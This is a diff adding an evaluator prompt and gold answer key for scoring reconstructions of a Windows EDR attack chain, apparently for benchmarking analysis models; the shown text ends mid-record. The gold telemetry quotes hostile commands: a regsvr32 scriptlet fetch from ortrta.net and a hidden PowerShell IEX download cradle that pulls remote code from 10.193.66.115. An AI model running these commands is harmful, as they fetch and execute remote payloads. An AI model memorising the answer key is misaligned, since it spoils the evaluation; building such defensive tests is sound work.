@@ -1,0 +1,1061 @@
+You are a strict evaluator for Windows endpoint behavior-chain reconstruction.
+
+Score CANDIDATE_OUTPUT against GOLD using action-claim metrics.
+
+Core definitions:
+- An action_claim is the smallest behavior assertion where one subject performs one operation against one object.
+- A candidate code_step may contain multiple action_claims. Split it when it contains multiple subjects, operations, objects, command lines, or unrelated behaviors.
+- The candidate's surface output is code_steps/code_sequence. The scoring unit is the action_claim you extract from those outputs.
+- Each action_claim can have at most these scoring slots: subject, operation, object, command_line, critical_evidence.
+- command_line is an attribute of the relevant action_claim. It is not an independent behavior step.
+- critical_evidence is one slot per action_claim. If the candidate lists many evidence rows for the same claim, select the best support and score only one critical_evidence slot. Do not increase the denominator because evidence is verbose.
+
+Primary metrics:
+- behavior_step_recall: step-level recall over GOLD.gold_step_count. A gold step is covered when at least one required item from that step is recovered.
+- action_step_recall: for every non-evidence GOLD.gold_required_items item (subject/operation/object/command_line), score 1 if the candidate reconstructs the same substantive value, otherwise 0.
+- action_step_precision: score gold-aligned correctness on the same dynamic non-evidence required-item denominator as recall. The numerator is the number of unique true-positive candidate subject/operation/object/command_line slots that match gold required items.
+- critical_evidence_recall: score critical_evidence separately. It is not part of the action_step_recall or action_step_precision denominator.
+- candidate_claim_precision is a diagnostic: for every non-null candidate action_claim slot you list, mark it as true positive or false positive against gold. This diagnostic keeps the candidate-side denominator.
+- behavior_sequence_order: score each gold order pair as 1 only when the related action claims are recovered and their relative order is correct.
+
+Extraction and denominator rules:
+- Action recall denominator is the number of non-critical-evidence GOLD.gold_required_items in the GOLD block. In this run it is 24.
+- Main action precision denominator is the same non-critical-evidence required-item count. In this run it is 24.
+- Step-level behavior_step_recall / coarse action-step coverage denominator is GOLD.gold_step_count. In this run it is 8.
+- Behavior order denominator is GOLD.gold_order_pair_count. In this run it is 7.
+- Candidate-side overclaiming is not folded into the main precision denominator. It is reported by candidate_claim_precision and overclaim_slot_count.
+- Do not list null, unknown, not observed, absent, or explicitly uncertain placeholder values as candidate slots.
+- If a candidate says an observed gold value does not exist, or makes a negative claim that contradicts observed evidence, list that negative claim as a false positive slot.
+- If the candidate mixes in a nearby unrelated behavior, split that nearby behavior into its own action_claims and score their slots as false positives unless they match gold.
+- Duplicate true-positive slots may match the same gold item only once for the numerator. Repeated duplicate claims do not increase the main precision denominator; they remain in the candidate_claim_precision denominator and overclaim diagnostics.
+- Do not score precision at the sentence, paragraph, major-claim, or coarse-step level.
+
+Evidence policy:
+- Gold uses critical_evidence, not arbitrary evidence count.
+- Candidate evidence verbosity must not expand recall or precision denominators.
+- CBC alert report_name/reason is evidence only.
+- If GOLD critical_evidence_policy excludes CBC alerts or the gold evaluation unit contains "non_alert", then CBC alert report_name, reason, alert_name, alert_id, and watchlist.hit rows are not valid true-positive critical_evidence.
+- If an alert name such as "Discovery - Query Registry" or "Persistence - Regmod Run or Runonce Key Modification" is emitted as the behavior operation, mark that operation slot as false positive with false_positive_type=alert_name_as_behavior.
+- Fabricated concrete PID, event_id, alert_id, path, command line, process relation, registry path, or timestamp must reduce precision and be listed in hallucinated_claims.
+- A real-but-noncritical extra evidence citation for an otherwise correct action_claim should not create additional denominator slots; unsupported or contradicted evidence should be counted in unsupported_evidence or contradicted_evidence diagnostics.
+
+Scoring style:
+- Give 0 for missing, ambiguous, partially wrong, unrelated-chain, or unsupported values. Do not use 0.5.
+- Return JSON only. All scores must be integer 0 or 1.
+- Use Japanese for reasons and summaries. Preserve raw paths, command lines, alert IDs, source_stream values, and timestamps exactly.
+
+Expected JSON schema:
+{
+  "case_id": "string",
+  "judge_summary_ja": "string",
+  "chains": [
+    {
+      "chain_id": "string",
+      "gold_required_item_scores": [
+        {
+          "item_id": "string",
+          "step_id": "string",
+          "kind": "subject|operation|object|command_line|critical_evidence",
+          "matched_candidate_excerpt": "string|null",
+          "score": "0|1",
+          "reason_ja": "string"
+        }
+      ],
+      "candidate_action_claim_scores": [
+        {
+          "candidate_claim_id": "string",
+          "candidate_step_id": "string|null",
+          "claim_excerpt": "string",
+          "normalized_action_claim_ja": "string",
+          "slot_scores": [
+            {
+              "slot_id": "string",
+              "kind": "subject|operation|object|command_line|critical_evidence",
+              "candidate_slot_excerpt": "string",
+              "matched_gold_item_id": "string|null",
+              "is_true_positive": "0|1",
+              "false_positive_type": "nearby_unrelated|hallucinated_value|alert_name_as_behavior|unsupported_negative|unsupported_inference|unsupported_evidence|contradicted_evidence|duplicate_claim|none",
+              "reason_ja": "string"
+            }
+          ]
+        }
+      ],
+      "order_pairs": [
+        {
+          "before_step_id": "string",
+          "after_step_id": "string",
+          "score": "0|1",
+          "reason_ja": "string"
+        }
+      ]
+    }
+  ],
+  "error_flags": {
+    "target_missing": [
+      "item_id"
+    ],
+    "chain_mixing": "boolean",
+    "hallucinated_claims": [
+      "string"
+    ],
+    "unsupported_evidence": [
+      "string"
+    ],
+    "contradicted_evidence": [
+      "string"
+    ],
+    "nearby_action_false_positives": [
+      "string"
+    ],
+    "weak_grounding": "boolean",
+    "false_positive_claims": [
+      "string"
+    ],
+    "notes_ja": [
+      "string"
+    ]
+  },
+  "candidate_action_claim_count": "integer",
+  "candidate_action_claim_slot_count": "integer",
+  "candidate_action_claim_true_positive_slot_count": "integer",
+  "hallucinated_claim_count": "integer",
+  "unsupported_evidence_count": "integer",
+  "contradicted_evidence_count": "integer",
+  "nearby_action_fp_count": "integer",
+  "main_missing_items": [
+    "string"
+  ],
+  "main_false_positive_claims": [
+    "string"
+  ]
+}
+
+GOLD:
+{
+  "evaluation_unit": "unique_process_time_cluster",
+  "case_id": null,
+  "gold_step_count": 8,
+  "gold_required_item_count": 32,
+  "gold_action_required_item_count": 24,
+  "gold_order_pair_count": 7,
+  "gold_required_items": [
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S01",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S01:subject",
+      "kind": "subject",
+      "gold_value": "EQNEDT32.EXE (PID 2244)",
+      "acceptable_terms": [
+        "EQNEDT32.EXE (PID 2244)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S01",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S01:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S01",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S01:object",
+      "kind": "object",
+      "gold_value": "regsvr32.exe (PID 3992)",
+      "acceptable_terms": [
+        "regsvr32.exe (PID 3992)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S01",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S01:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S02",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S02:subject",
+      "kind": "subject",
+      "gold_value": "regsvr32.exe (PID 3992)",
+      "acceptable_terms": [
+        "regsvr32.exe (PID 3992)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S02",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S02:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S02",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S02:object",
+      "kind": "object",
+      "gold_value": "powershell.exe (PID 2340)",
+      "acceptable_terms": [
+        "powershell.exe (PID 2340)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S02",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S02:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S03",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S03:subject",
+      "kind": "subject",
+      "gold_value": "powershell.exe (PID 2340)",
+      "acceptable_terms": [
+        "powershell.exe (PID 2340)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S03",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S03:operation",
+      "kind": "operation",
+      "gold_value": "initiated connection",
+      "acceptable_terms": [
+        "initiated connection"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S03",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S03:object",
+      "kind": "object",
+      "gold_value": "ortrta.net / 10.193.66.115:8080",
+      "acceptable_terms": [
+        "ortrta.net / 10.193.66.115:8080"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S03",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S03:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S04",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S04:subject",
+      "kind": "subject",
+      "gold_value": "powershell.exe (PID 2340)",
+      "acceptable_terms": [
+        "powershell.exe (PID 2340)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S04",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S04:operation",
+      "kind": "operation",
+      "gold_value": "initiated connection",
+      "acceptable_terms": [
+        "initiated connection"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S04",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S04:object",
+      "kind": "object",
+      "gold_value": "ortrta.net / 10.193.66.115:8443",
+      "acceptable_terms": [
+        "ortrta.net / 10.193.66.115:8443"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S04",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S04:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S05",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S05:subject",
+      "kind": "subject",
+      "gold_value": "powershell.exe (PID 2340)",
+      "acceptable_terms": [
+        "powershell.exe (PID 2340)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S05",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S05:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S05",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S05:object",
+      "kind": "object",
+      "gold_value": "cmd.exe (PID 1880)",
+      "acceptable_terms": [
+        "cmd.exe (PID 1880)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S05",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S05:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S06",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S06:subject",
+      "kind": "subject",
+      "gold_value": "cmd.exe (PID 1880)",
+      "acceptable_terms": [
+        "cmd.exe (PID 1880)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S06",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S06:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S06",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S06:object",
+      "kind": "object",
+      "gold_value": "C:\\Users\\aalsahee\\payload.exe (PID 3208)",
+      "acceptable_terms": [
+        "C:\\Users\\aalsahee\\payload.exe (PID 3208)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S06",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S06:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S07",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S07:subject",
+      "kind": "subject",
+      "gold_value": "payload.exe (PID 3208)",
+      "acceptable_terms": [
+        "payload.exe (PID 3208)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S07",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S07:operation",
+      "kind": "operation",
+      "gold_value": "started",
+      "acceptable_terms": [
+        "started"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S07",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S07:object",
+      "kind": "object",
+      "gold_value": "payload.exe (PID 4964)",
+      "acceptable_terms": [
+        "payload.exe (PID 4964)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S07",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S07:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S08",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S08:subject",
+      "kind": "subject",
+      "gold_value": "payload.exe (PID 4964)",
+      "acceptable_terms": [
+        "payload.exe (PID 4964)"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S08",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S08:operation",
+      "kind": "operation",
+      "gold_value": "initiated connection",
+      "acceptable_terms": [
+        "initiated connection"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S08",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S08:object",
+      "kind": "object",
+      "gold_value": "ortrta.net / 10.193.66.115:9999",
+      "acceptable_terms": [
+        "ortrta.net / 10.193.66.115:9999"
+      ]
+    },
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "step_id": "S3-05-S08",
+      "item_id": "s3_pt_03_regsvr32_long_chain:S3-05-S08:critical_evidence",
+      "kind": "critical_evidence",
+      "gold_value": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+      "acceptable_terms": [
+        "Canonical CBC EDR telemetry event row (Stage 3-visible)"
+      ]
+    }
+  ],
+  "critical_evidence_policy": null,
+  "chains": [
+    {
+      "chain_id": "s3_pt_03_regsvr32_long_chain",
+      "chain_title": "S3-C3: regsvr32 to PowerShell/payload lineage",
+      "gold_steps": [
+        {
+          "step_id": "S3-05-S01",
+          "order": 1,
+          "subject": "EQNEDT32.EXE (PID 2244)",
+          "action": "started",
+          "object": "regsvr32.exe (PID 3992)",
+          "evidence_kind": "parent_child",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "Equation Editor が regsvr32 を起動した。",
+          "process_code_object": "regsvr32.exe (PID 3992)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 17797,
+              "timestamp_utc": "2022-07-19T14:36:16.0888308Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe",
+              "process_pid": 2244,
+              "parent_path": "c:\\windows\\system32\\svchost.exe",
+              "parent_pid": 648,
+              "process_cmdline": "\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding",
+              "object_name": "c:\\windows\\system32\\regsvr32.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\windows\\system32\\regsvr32.exe",
+              "childproc_pid": 3992
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=17797 time=2022-07-19T14:36:16.0888308Z action=ACTION_CREATE_PROCESS process=c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe pid=2244 parent_path=c:\\windows\\system32\\svchost.exe parent_pid=648 process_cmdline=\"C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\" -Embedding object_name=c:\\windows\\system32\\regsvr32.exe childproc_name=c:\\windows\\system32\\regsvr32.exe childproc_pid=3992"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S02",
+          "order": 2,
+          "subject": "regsvr32.exe (PID 3992)",
+          "action": "started",
+          "object": "powershell.exe (PID 2340)",
+          "evidence_kind": "parent_child_command",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "regsvr32 が hidden/IEX を含む PowerShell を起動した。",
+          "process_code_object": "powershell.exe (PID 2340)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 17863,
+              "timestamp_utc": "2022-07-19T14:36:16.3384313Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\regsvr32.exe",
+              "process_pid": 3992,
+              "parent_path": "c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe",
+              "parent_pid": 2244,
+              "process_cmdline": "regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll",
+              "object_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "childproc_pid": 2340
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=17863 time=2022-07-19T14:36:16.3384313Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\regsvr32.exe pid=3992 parent_path=c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe parent_pid=2244 process_cmdline=regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll object_name=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe childproc_name=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe childproc_pid=2340"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S03",
+          "order": 3,
+          "subject": "powershell.exe (PID 2340)",
+          "action": "initiated connection",
+          "object": "ortrta.net / 10.193.66.115:8080",
+          "evidence_kind": "network",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "PowerShell が 10.193.66.115:8080 への接続作成を記録した。",
+          "process_code_object": "ortrta.net / 10.193.66.115:8080",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 18136,
+              "timestamp_utc": "2022-07-19T14:36:18.6472353Z",
+              "action": "ACTION_CONNECTION_CREATE",
+              "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "process_pid": 2340,
+              "parent_path": "c:\\windows\\system32\\regsvr32.exe",
+              "parent_pid": 3992,
+              "process_cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));",
+              "object_name": "ortrta.net",
+              "remote_ip": "10.193.66.115",
+              "remote_port": 8080,
+              "netconn_domain": "ortrta.net",
+              "childproc_name": null,
+              "childproc_pid": null
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=18136 time=2022-07-19T14:36:18.6472353Z action=ACTION_CONNECTION_CREATE process=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe pid=2340 parent_path=c:\\windows\\system32\\regsvr32.exe parent_pid=3992 process_cmdline=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK')); object_name=ortrta.net remote_ip=10.193.66.115 remote_port=8080 netconn_domain=ortrta.net"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S04",
+          "order": 4,
+          "subject": "powershell.exe (PID 2340)",
+          "action": "initiated connection",
+          "object": "ortrta.net / 10.193.66.115:8443",
+          "evidence_kind": "network",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "PowerShell が 10.193.66.115:8443 への接続作成を記録した。",
+          "process_code_object": "ortrta.net / 10.193.66.115:8443",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 18152,
+              "timestamp_utc": "2022-07-19T14:36:18.9904359Z",
+              "action": "ACTION_CONNECTION_CREATE",
+              "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "process_pid": 2340,
+              "parent_path": "c:\\windows\\system32\\regsvr32.exe",
+              "parent_pid": 3992,
+              "process_cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));",
+              "object_name": "ortrta.net",
+              "remote_ip": "10.193.66.115",
+              "remote_port": 8443,
+              "netconn_domain": "ortrta.net",
+              "childproc_name": null,
+              "childproc_pid": null
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=18152 time=2022-07-19T14:36:18.9904359Z action=ACTION_CONNECTION_CREATE process=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe pid=2340 parent_path=c:\\windows\\system32\\regsvr32.exe parent_pid=3992 process_cmdline=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK')); object_name=ortrta.net remote_ip=10.193.66.115 remote_port=8443 netconn_domain=ortrta.net"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S05",
+          "order": 5,
+          "subject": "powershell.exe (PID 2340)",
+          "action": "started",
+          "object": "cmd.exe (PID 1880)",
+          "evidence_kind": "parent_child",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "PowerShell が cmd.exe を起動した。",
+          "process_code_object": "cmd.exe (PID 1880)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 18350,
+              "timestamp_utc": "2022-07-19T14:37:17.3969385Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "process_pid": 2340,
+              "parent_path": "c:\\windows\\system32\\regsvr32.exe",
+              "parent_pid": 3992,
+              "process_cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK'));",
+              "object_name": "c:\\windows\\system32\\cmd.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\windows\\system32\\cmd.exe",
+              "childproc_pid": 1880
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=18350 time=2022-07-19T14:37:17.3969385Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe pid=2340 parent_path=c:\\windows\\system32\\regsvr32.exe parent_pid=3992 process_cmdline=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString('http://10.193.66.115:8080/sF5riGj4K26DK')); object_name=c:\\windows\\system32\\cmd.exe childproc_name=c:\\windows\\system32\\cmd.exe childproc_pid=1880"
+            ]
+          }
+        },
+        {
+          "step_id": "S3-05-S06",
+          "order": 6,
+          "subject": "cmd.exe (PID 1880)",
+          "action": "started",
+          "object": "C:\\Users\\aalsahee\\payload.exe (PID 3208)",
+          "evidence_kind": "parent_child",
+          "evidence_basis": "Canonical CBC EDR telemetry event row (Stage 3-visible)",
+          "confidence": "observed",
+          "one_line_ja": "cmd.exe が payload.exe を起動した。",
+          "process_code_object": "C:\\Users\\aalsahee\\payload.exe (PID 3208)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 18358,
+              "timestamp_utc": "2022-07-19T14:37:20.2361435Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\cmd.exe",
+              "process_pid": 1880,
+              "parent_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "parent_pid": 2340,
+              "process_cmdline": "C:\\Windows\\system32\\cmd.exe",
+              "object_name": "c:\\users\\aalsahee\\payload.exe",
